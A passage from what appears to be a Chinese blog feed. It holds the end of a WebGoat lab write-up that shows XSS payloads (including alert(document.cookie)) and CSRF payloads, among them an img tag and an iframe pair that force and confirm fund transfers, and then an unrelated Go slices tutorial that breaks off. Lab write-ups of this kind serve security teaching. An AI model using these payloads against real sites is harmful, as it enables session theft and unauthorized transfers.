src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image017.png" alt="clip_image017"></p><p>下方提示输入账号密码进行钓鱼，等待用户提交：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image018.png" alt="clip_image018"></p><h4 id="2-1-2-结果截图"><a href="#2-1-2-结果截图" class="headerlink" title="2.1.2 结果截图"></a>2.1.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image019.png" alt="clip_image019"></p><h3 id="2-2-常驻攻击—Stored-XSS-Attacks"><a href="#2-2-常驻攻击—Stored-XSS-Attacks" class="headerlink" title="2.2 常驻攻击—Stored XSS Attacks"></a>2.2 常驻攻击—Stored XSS Attacks</h3><h4 id="2-2-1-操作说明"><a href="#2-2-1-操作说明" class="headerlink" title="2.2.1 操作说明"></a>2.2.1 操作说明</h4><p>在输入消息框中填入XSS代码：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language<span class="operator">=</span><span class="string">&quot;javascript&quot;</span> type<span class="operator">=</span><span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">alert(<span class="string">&quot;This is XSS!&quot;</span>)<span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image020.png" alt="clip_image020"></p><p>提交后点击下方可以执行代码。</p><h4 id="2-2-2-结果截图"><a href="#2-2-2-结果截图" class="headerlink" title="2.2.2 结果截图"></a>2.2.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image021.png" alt="clip_image021"></p><h3 id="2-3-反射型XSS攻击—Reflected-XSS-Attacks"><a href="#2-3-反射型XSS攻击—Reflected-XSS-Attacks" class="headerlink" title="2.3 反射型XSS攻击—Reflected XSS Attacks"></a>2.3 反射型XSS攻击—Reflected XSS Attacks</h3><h4 id="2-3-1-操作说明"><a href="#2-3-1-操作说明" class="headerlink" title="2.3.1 操作说明"></a>2.3.1 操作说明</h4><p>在digit access code框中添加：</p><p><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image022.png" alt="clip_image022">点击Purchase：</p><h4 id="2-3-2-结果截图"><a href="#2-3-2-结果截图" class="headerlink" title="2.3.2 结果截图"></a><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image023.png" alt="clip_image023">2.3.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image024.png" alt="clip_image024"></p><h3 id="2-4块反射攻击—Block-Reflected-XSS"><a href="#2-4块反射攻击—Block-Reflected-XSS" class="headerlink" title="2.4块反射攻击—Block Reflected XSS"></a>2.4块反射攻击—Block Reflected XSS</h3><h4 id="2-4-1-操作说明"><a href="#2-4-1-操作说明" class="headerlink" title="2.4.1 操作说明"></a>2.4.1 操作说明</h4><p><strong>Stage 1:</strong></p><p>登入Tom的个人页面，修改LastName为: <code>&lt;script&gt;alert(&#39;hello,hack&#39;);&lt;/script&gt;</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image025.png" alt="clip_image025"></p><p>保存成功时会执行代码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image026.png" alt="clip_image026"></p><p>通过Jerry查看Tom资料时也会显示该弹窗。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image027.png" alt="clip_image027"></p><h4 id="2-4-2-结果截图"><a href="#2-4-2-结果截图" class="headerlink" title="2.4.2 结果截图"></a>2.4.2 结果截图</h4><h2 id="3-跨站请求伪造CSRF攻击"><a href="#3-跨站请求伪造CSRF攻击" class="headerlink" title="3 跨站请求伪造CSRF攻击"></a>3 跨站请求伪造CSRF攻击</h2><h3 id="3-1-Cross-Site-Request-Forgery-CSRF"><a href="#3-1-Cross-Site-Request-Forgery-CSRF" class="headerlink" title="3.1 Cross Site Request Forgery(CSRF)"></a>3.1 Cross Site Request Forgery(CSRF)</h3><h4 id="3-1-1-操作说明"><a href="#3-1-1-操作说明" class="headerlink" title="3.1.1 操作说明"></a>3.1.1 操作说明</h4><p>在email中包含一张图片，图片的URL指向一个恶意请求。实验中，URL应指向attack servlet，参数有Screen与menu，还有一个额外的参数transferFunds带有任意数值。收件人刚好进行身份认证，正在转移资金:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;img src=&quot;/Users/q1jun/Documents/笔记/课程笔记/软件<span class="variable">&amp;</span>Web安全开发/attack?Screen=<span class="number">2078372</span><span class="variable">&amp;menu</span>=<span class="number">900</span><span class="variable">&amp;</span>transferFunds=<span class="number">5000</span>&quot;/&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image028.png" alt="clip_image028"></p><p>点击title：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image029.png" alt="clip_image029"></p><h4 id="3-1-2-结果截图"><a href="#3-1-2-结果截图" class="headerlink" title="3.1.2 结果截图"></a>3.1.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image030.png" alt="clip_image030"></p><h3 id="3-2-CSRF-Prompt-By-Pass"><a href="#3-2-CSRF-Prompt-By-Pass" class="headerlink" title="3.2 CSRF Prompt By-Pass"></a>3.2 CSRF Prompt By-Pass</h3><h4 id="3-2-1-操作说明"><a href="#3-2-1-操作说明" class="headerlink" title="3.2.1 操作说明"></a>3.2.1 操作说明</h4><p>实验需要向新闻组发送email包含以下恶意请求，首先转账，然后请求提示确认。</p><p>在email的正文中输入如下javascript代码:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;iframe</span><br><span class="line"></span><br><span class="line">    src<span class="operator">=</span><span class="string">&quot;http://localhost:8080/WebGoat/attack?Screen=XXX&amp;menu=YYY&amp;transferFunds=5000&quot;</span></span><br><span class="line"></span><br><span class="line">    id<span class="operator">=</span><span class="string">&quot;myFrame&quot;</span> frameborder<span class="operator">=</span><span class="string">&quot;1&quot;</span> marginwidth<span class="operator">=</span><span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">    marginheight<span class="operator">=</span><span class="string">&quot;0&quot;</span> width<span class="operator">=</span><span class="string">&quot;800&quot;</span> scrolling<span class="operator">=</span>yes height<span class="operator">=</span><span class="string">&quot;300&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">onload</span><span class="operator">=</span><span class="string">&quot;document.getElementById(&#x27;frame2&#x27;).src=&#x27;http://localhost:8080/WebGoat/attack?Screen=XXX&amp;menu=YYY&amp;transferFunds=CONFIRM&#x27;;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe</span><br><span class="line"></span><br><span class="line">    id<span class="operator">=</span><span class="string">&quot;frame2&quot;</span> frameborder<span class="operator">=</span><span class="string">&quot;1&quot;</span> marginwidth<span class="operator">=</span><span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">    marginheight<span class="operator">=</span><span class="string">&quot;0&quot;</span> width<span class="operator">=</span><span class="string">&quot;800&quot;</span> scrolling<span class="operator">=</span>yes height<span class="operator">=</span><span class="string">&quot;300&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image031.png" alt="clip_image031"></p><h4 id="3-2-2-结果截图"><a href="#3-2-2-结果截图" class="headerlink" title="3.2.2 结果截图"></a>3.2.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image032.png" alt="clip_image032"></p><h3 id="3-3-CSRF-Token-By-Pass"><a href="#3-3-CSRF-Token-By-Pass" class="headerlink" title="3.3 CSRF Token By-Pass"></a>3.3 CSRF Token By-Pass</h3><h4 id="3-3-1-操作说明"><a href="#3-3-1-操作说明" class="headerlink" title="3.3.1 操作说明"></a>3.3.1 操作说明</h4><p>进入CSRF Token By-Pass后在网页URL后加上<code>transferFunds=main</code>，用以进入转账页面，获取token。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image033.png" alt="clip_image033"></p><p>回车：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image035.png" alt="clip_image035"></p><p>通过转账页面输入5000进行提交操作，然后通过Burpsuite进行抓包：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image039.png" alt="clip_image039"></p><p>分析所得数据包：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image040.png" alt="clip_image040"></p><p>可以得到<code>Post请求路径</code>中的参数和<code>CSRFToken</code>的值！</p><p>接下来构造CSRF代码，注意以下参数：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image041.png" alt="clip_image041"></p><p>复制到Message框中，点击提交：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image042.png" alt="clip_image042"></p><p>在下面的Message List中点开邮件，输入5000并提交：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image043.png" alt="clip_image043"></p><p>完成：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image044.png" alt="clip_image044"></p><h4 id="3-3-2-结果截图"><a href="#3-3-2-结果截图" class="headerlink" title="3.3.2 结果截图"></a>3.3.2 结果截图</h4><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/clip_image045.png" alt="clip_image045"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> WebGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang 切片</title>
      <link href="/2021/12/06/9b01a76723e5-q1jun/"/>
      <url>/2021/12/06/9b01a76723e5-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Go-切片：-用法与本质"><a href="#Go-切片：-用法与本质" class="headerlink" title="Go 切片： 用法与本质"></a>Go 切片： 用法与本质</h1><h2 id="0x01-引言"><a href="#0x01-引言" class="headerlink" title="0x01 引言"></a>0x01 引言</h2><p>Go的切片类型为处理同类型数据序列提供一个方便而高效的方式。 切片有些类似于其他语言中的数组，但是有一些不同寻常的特性。 本文将深入切片的本质，并讲解它的用法。</p><h2 id="0x02-数组-Array"><a href="#0x02-数组-Array" class="headerlink" title="0x02 数组(Array)"></a>0x02 数组(Array)</h2><p>Go的切片是在数组之上的抽象数据类型，因此在了解切片之前必须要先理解数组。</p><p>数组类型定义了长度和元素类型。例如， <code>[4]int</code> 类型表示一个四个整数的数组。 数组的长度是固定的，长度是数组类型的一部分（ <code>[4]int</code> 和 <code>[5]int</code> 是完全不同的类型）。 数组可以以常规的索引方式访问，表达式 <code>s[n]</code> 访问数组的第 n 个元素。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a [<span class="number">4</span>]<span class="type">int</span></span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">i := a[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// i == 1</span></span><br></pre></td></tr></table></figure><p>数组不需要显式的初始化；数组的零值是可以直接使用的，数组元素会自动初始化为其对应类型的零值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a[2] == 0, int 类型的零值</span></span><br></pre></td></tr></table></figure><p>类型 <code>[4]int</code> 对应内存中四个连续的整数：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/go-slices-usage-and-internals_slice-array.png" alt="img"></p><p>Go的数组是值语义。一个数组变量表示整个数组，它不是指向第一个元素的指针（不像 C 语言的数组）。 当一个数组变量被赋值或者被传递的时候，实际上会复制整个数组。 （为了避免复制数组，你可以传递一个指向数组的指针，但是数组指针并不是数组。） 可以将数组看作一个特殊的struct，结构的字段名对应数组的索引，同时成员的数目固定。</p><p>数组的字面值像这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b := [<span class="number">2</span>]<span class="type">string</span>&#123;<span class="string">&quot;Penn&quot;</span>, <span class="string">&quot;Teller&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>当然，也可以让编译器统计数组字面值中元素的数目：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b := [...]<span class="type">string</span>&#123;<span class="string">&quot;Penn&quot;</span>, <span class="string">&quot;Teller&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>这两种写法， <code>b</code> 都是对应 <code>[2]string</code> 类型。</p><h2 id="0x03-切片-Slices"><a href="#0x03-切片-Slices" class="headerlink" title="0x03 切片(Slices)"></a>0x03 切片(Slices)</h2><p>数组虽然有适用它们的地方，但是数组不够灵活，因此在Go代码中数组使用的并不多。 但是，切片则使用得相当广泛。切片基于数组构建，但是提供更强的功能和便利。</p><p>切片类型的写法是 <code>[]T</code> ， <code>T</code> 是切片元素的类型。和数组不同的是，切片类型并没有给定固定的长度。</p><p>切片的字面值和数组字面值很像，不过切片没有指定元素个数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">letters := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>切片可以使用内置函数 <code>make</code> 创建，函数签名为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">make</span><span class="params">([]T, <span class="built_in">len</span>, <span class="built_in">cap</span>)</span></span> []T</span><br></pre></td></tr></table></figure><p>其中T代表被创建的切片元素的类型。函数 <code>make</code> 接受一个类型、一个长度和一个可选的容量参数。 调用 <code>make</code> 时，内部会分配一个数组，然后返回数组对应的切片。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s []<span class="type">byte</span></span><br><span class="line">s = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">// s == []byte&#123;0, 0, 0, 0, 0&#125;</span></span><br></pre></td></tr></table></figure><p>当容量参数被忽略时，它默认为指定的长度。下面是简洁的写法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>可以使用内置函数 <code>len</code> 和 <code>cap</code> 获取切片的长度和容量信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(s) == <span class="number">5</span></span><br><span class="line"><span class="built_in">cap</span>(s) == <span class="number">5</span></span><br></pre></td></tr></table></figure><p>接下来的两个小节将讨论长度和容量之间的关系。</p><p>切片的零值为 <code>nil</code> 。对于切片的零值， <code>len</code> 和 <code>cap</code> 都将返回0。</p><p>切片也可以基于现有的切片或数组生成。切分的范围由两个由冒号分割的索引对应的半开区间指定。 例如，表达式 <code>b[1:4]</code> 创建的切片引用数组 <code>b</code> 的第1到3个元素空间（对应切片的索引为0到2）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b := []<span class="type">byte</span>&#123;<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;g&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// b[1:4] == []byte&#123;&#x27;o&#x27;, &#x27;l&#x27;, &#x27;a&#x27;&#125;, sharing the same storage as b</span></span><br></pre></td></tr></table></figure><p>切片的开始和结束的索引都是可选的；它们分别默认为零和数组的长度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b[:2] == []byte&#123;&#x27;g&#x27;, &#x27;o&#x27;&#125;</span></span><br><span class="line"><span class="comment">// b[2:] == []byte&#123;&#x27;l&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;g&#x27;&#125;</span></span><br><span class="line"><span class="comment">// b[:] == b</span></span><br></pre></td></tr></table></figure><p>下面语法也是基于数组创建一个切片：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x := [<span class="number">3</span>]<span class="type">string</span>&#123;<span class="string">&quot;Лайка&quot;</span>, <span class="string">&quot;Белка&quot;</span>, <span class="string">&quot;Стрелка&quot;</span>&#125;</span><br><span class="line">s := x[:] <span class="comment">// a slice referencing the storage of x</span></span><br></pre></td></tr></table></figure><h2 id="0x04-切片的内幕"><a href="#0x04-切片的内幕" class="headerlink" title="0x04 切片的内幕"></a>0x04 切片的内幕</h2><p>一个切片是一个数组片段的描述。它包含了指向数组的指针，片段的长度， 和容量（片段的最大长度）。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/go-slices-usage-and-internals_slice-struct.png" alt="img"></p><p>前面使用 <code>make([]byte, 5)</code> 创建的切片变量 <code>s</code> 的结构如下：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/go-slices-usage-and-internals_slice-1.png" alt="img"></p><p>长度是切片引用的元素数目。容量是底层数组的元素数目（从切片指针开始）。 关于长度和容量和区域将在下一个例子说明。</p><p>我们继续对 <code>s</code> 进行切片，观察切片的数据结构和它引用的底层数组：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = s[<span class="number">2</span>:<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/go-slices-usage-and-internals_slice-2.png" alt="img"></p><p>切片操作并不复制切片指向的元素。它创建一个新的切片并复用原来切片的底层数组。 这使得切片操作和数组索引一样高效。因此，通过一个新切片修改元素会影响到原始切片的对应元素。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d := []<span class="type">byte</span>&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line">e := d[<span class="number">2</span>:]</span><br><span class="line"><span class="comment">// e == []byte&#123;&#x27;a&#x27;, &#x27;d&#x27;&#125;</span></span><br><span class="line">e[<span class="number">1</span>] = <span class="string">&#x27;m&#x27;</span></span><br><span class="line"><span class="comment">// e == []byte&#123;&#x27;a&#x27;, &#x27;m&#x27;&#125;</span></span><br><span class="line"><span class="comment">// d == []byte&#123;&#x27;r&#x27;, &#x27;o&#x27;, &#x27;a&#x27;, &#x27;m&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>前面创建的切片 <code>s</code> 长度小于它的容量。我们可以增长切片的长度为它的容量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = s[:<span class="built_in">cap</span>(s)]</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/go-slices-usage-and-internals_slice-3.png" alt="img"></p><p>切片增长不能超出其容量。增长超出切片容量将会导致运行时异常，就像切片或数组的索引超 出范围引起异常一样。同样，不能使用小于零的索引去访问切片之前的元素。</p><h2 id="0x05-切片的生长-copy-and-append-函数"><a href="#0x05-切片的生长-copy-and-append-函数" class="headerlink" title="0x05 切片的生长(copy and append 函数)"></a>0x05 切片的生长(copy and append 函数)</h2><p>要增加切片的容量必须创建一个新的、更大容量的切片，然后将原有切片的内容复制到新的切片。 整个技术是一些支持动态数组语言的常见实现。下面的例子将切片 <code>s</code> 容量翻倍，先创建一个2倍 容量的新切片 <code>t</code> ，复制 <code>s</code> 的元素到 <code>t</code> ，然后将 <code>t</code> 赋值给 <code>s</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(s), (<span class="built_in">cap</span>(s)+<span class="number">1</span>)*<span class="number">2</span>) <span class="comment">// +1 in case cap(s) == 0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> s &#123;</span><br><span class="line">        t[i] = s[i]</span><br><span class="line">&#125;</span><br><span class="line">s = t</span><br></pre></td></tr></table></figure><p>循环中复制的操作可以由 copy 内置函数替代。copy 函数将源切片的元素复制到目的切片。 它返回复制元素的数目。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">copy</span><span class="params">(dst, src []T)</span></span> <span class="type">int</span></span><br></pre></td></tr></table></figure><p><code>copy</code> 函数支持不同长度的切片之间的复制（它只复制较短切片的长度个元素）。 此外， <code>copy</code> 函数可以正确处理源和目的切片有重叠的情况。</p><p>使用 <code>copy</code> 函数，我们可以简化上面的代码片段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(s), (<span class="built_in">cap</span>(s)+<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">copy</span>(t, s)</span><br><span class="line">s = t</span><br></pre></td></tr></table></figure><p>一个常见的操作是将数据追加到切片的尾部。下面的函数将元素追加到切片尾部， 必要的话会增加切片的容量，最后返回更新的切片：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AppendByte</span><span class="params">(slice []<span class="type">byte</span>, data ...<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">    m := <span class="built_in">len</span>(slice)</span><br><span class="line">    n := m + <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="built_in">cap</span>(slice) &#123; <span class="comment">// if necessary, reallocate</span></span><br><span class="line">        <span class="comment">// allocate double what&#x27;s needed, for future growth.</span></span><br><span class="line">        newSlice := <span class="built_in">make</span>([]<span class="type">byte</span>, (n+<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">copy</span>(newSlice, slice)</span><br><span class="line">        slice = newSlice</span><br><span class="line">    &#125;</span><br><span class="line">    slice = slice[<span class="number">0</span>:n]</span><br><span class="line">    <span class="built_in">copy</span>(slice[m:n], data)</span><br><span class="line">    <span class="keyword">return</span> slice</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是 <code>AppendByte</code> 的一种用法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p := []<span class="type">byte</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>&#125;</span><br><span class="line">p = AppendByte(p, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>)</span><br><span class="line"><span class="comment">// p == []byte&#123;2, 3, 5, 7, 11, 13&#125;</span></span><br></pre></td></tr></table></figure><p>类似 <code>AppendByte</code> 的函数比较实用，因为它提供了切片容量增长的完全控制。 根据程序的特点，可能希望分配较小的活较大的块，或则是超过某个大小再分配。</p><p>但大多数程序不需要完全的控制，因此Go提供了一个内置函数 <code>append</code> ， 用于大多数场合；它的函数签名：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">append</span><span class="params">(s []T, x ...T)</span></span> []T</span><br></pre></td></tr></table></figure><p><code>append</code> 函数将 <code>x</code> 追加到切片 <code>s</code> 的末尾，并且在必要的时候增加容量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// a == []int&#123;0&#125;</span></span><br><span class="line">a = <span class="built_in">append</span>(a, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// a == []int&#123;0, 1, 2, 3&#125;</span></span><br></pre></td></tr></table></figure><p>如果是要将一个切片追加到另一个切片尾部，需要使用 <code>...</code> 语法将第2个参数展开为参数列表。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a := []<span class="type">string</span>&#123;<span class="string">&quot;John&quot;</span>, <span class="string">&quot;Paul&quot;</span>&#125;</span><br><span class="line">b := []<span class="type">string</span>&#123;<span class="string">&quot;George&quot;</span>, <span class="string">&quot;Ringo&quot;</span>, <span class="string">&quot;Pete&quot;</span>&#125;</span><br><span class="line">a = <span class="built_in">append</span>(a, b...) <span class="comment">// equivalent to &quot;append(a, b[0], b[1], b[2])&quot;</span></span><br><span class="line"><span class="comment">// a == []string&#123;&quot;John&quot;, &quot;Paul&quot;, &quot;George&quot;, &quot;Ringo&quot;, &quot;Pete&quot;&#125;</span></span><br></pre></td></tr></table></figure><p>由于切片的零值 <code>nil</code> 用起来就像一个长度为零的切片，我们可以声明一个切片变量然后在循环 中向它追加数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Filter returns a new slice holding only</span></span><br><span class="line"><span class="comment">// the elements of s that satisfy fn()</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Filter</span><span class="params">(s []<span class="type">int</span>, fn <span class="keyword">func</span>(<span class="type">int</span>)</span></span> <span class="type">bool</span>) []<span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> p []<span class="type">int</span> <span class="comment">// == nil</span></span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> s &#123;</span><br><span class="line">        <span class="keyword">if</span> fn(v) &#123;</span><br><span class="line">            p = <span class="built_in">append</span>(p, v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-切片的“陷阱”"><a href="#0x06-切片的“陷阱”" class="headerlink" title="0x06 切片的“陷阱”"></a>0x06 切片的“陷阱”</h2><p>正如前面所说，切片操作并不会复制底层的数组。整个数组将被保存在内存中，直到它不再被引用。 有时候可能会因为一个小的内存引用导致保存所有的数据。</p><p>例如， <code>FindDigits</code> 函数加载整个文件到内存，然后搜索第一个连续的数字，最后结果以切片方式返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 